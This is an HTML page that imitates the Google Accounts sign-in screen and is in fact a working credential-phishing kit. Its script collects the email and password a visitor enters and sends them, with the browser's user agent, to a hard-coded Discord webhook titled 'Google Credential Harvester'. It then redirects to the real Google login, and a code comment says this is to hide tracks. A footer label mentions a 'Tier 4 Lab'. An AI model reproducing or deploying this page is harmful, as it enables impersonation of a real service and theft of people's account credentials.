<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
        p { color: #202124; font-size: 16px; margin-bottom: 24px; }
        .input-group { margin-bottom: 10px; text-align: left; position: relative; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; transition: border 0.2s; }
        input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
        .forgot { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; text-align: left; margin-top: 9px; display: block; text-decoration: none; }
        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
        .create { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        button:hover { background-color: #1b66ca; box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15); }
        #loading { display: none; color: #5f6368; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        
        <div class="input-group">
            <input type="email" id="email" placeholder="Email or phone" required>
        </div>
        <div class="input-group" style="margin-top: 15px;">
            <input type="password" id="password" placeholder="Enter your password" required>
        </div>
        
        <a href="#" class="forgot">Forgot password?</a>
        
        <div id="loading">Verifying account...</div>

        <div class="footer">
            <span class="create">Create account</span>
            <button onclick="sendData()">Next</button>
        </div>
    </div>

    <script>
        async function sendData() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            const webhook = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";

            if (!email || !pass) {
                alert("Please fill in all fields.");
                return;
            }

            document.getElementById('loading').style.display = "block";

            const payload = {
                username: "Google Credential Harvester",
                embeds: [{
                    title: "New Credentials Captured",
                    color: 16711680,
                    fields: [
                        { name: "Email", value: email, inline: true },
                        { name: "Password", value: `\`${pass}\``, inline: true },
                        { name: "User-Agent", value: navigator.userAgent }
                    ],
                    footer: { text: "ENI-Tutor | Tier 4 Lab" },
                    timestamp: new Date()
                }]
            };

            try {
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                // Redirect to actual Google login to hide tracks
                setTimeout(() => {
                    window.location.href = "https://accounts.google.com/signin/v2/identifier";
                }, 1500);
            } catch (err) {
                console.error("Transmission failed.", err);
            }
        }
    </script>
</body>
</html>
